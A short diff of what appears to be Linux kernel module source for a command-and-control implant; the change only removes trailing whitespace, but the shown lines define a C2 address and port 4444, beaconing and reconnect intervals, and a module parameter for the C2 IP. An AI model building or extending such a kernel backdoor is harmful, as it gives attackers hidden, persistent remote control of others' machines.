@@ -13,14 +13,14 @@
 #include <linux/types.h>
 #include "c2.h"
 
-#include "kernel.h" 
+#include "kernel.h"
 
 #define C2_BUFFER_SIZE 512
 
 static char *c2_ip = "127.0.0.1";
 static int c2_port = 4444;
-static int beacon_interval = 30;       
-static int reconnect_interval = 5;       
+static int beacon_interval = 30;
+static int reconnect_interval = 5;
 static int max_reconnect_interval = 60;
 
 module_param(c2_ip, charp, 0644);
